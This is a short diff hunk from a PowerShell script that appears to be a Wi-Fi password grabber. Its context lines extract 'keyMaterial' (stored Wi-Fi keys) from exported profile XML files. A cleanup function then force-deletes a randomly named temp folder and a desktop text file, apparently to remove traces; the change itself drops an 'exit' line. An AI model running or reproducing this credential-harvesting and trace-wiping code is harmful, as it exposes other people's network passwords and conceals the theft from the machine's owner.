@@ -43,7 +43,6 @@ Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMateri
 function Del-Wifi-File {
 Set-Location -Path "$env:temp"
 Remove-Item -Path "$env:tmp/js2k3kd4nne5dhsk" -Force -Recurse;rm $desktop\0.txt
-exit
  }
 Create-Wifi-File
 
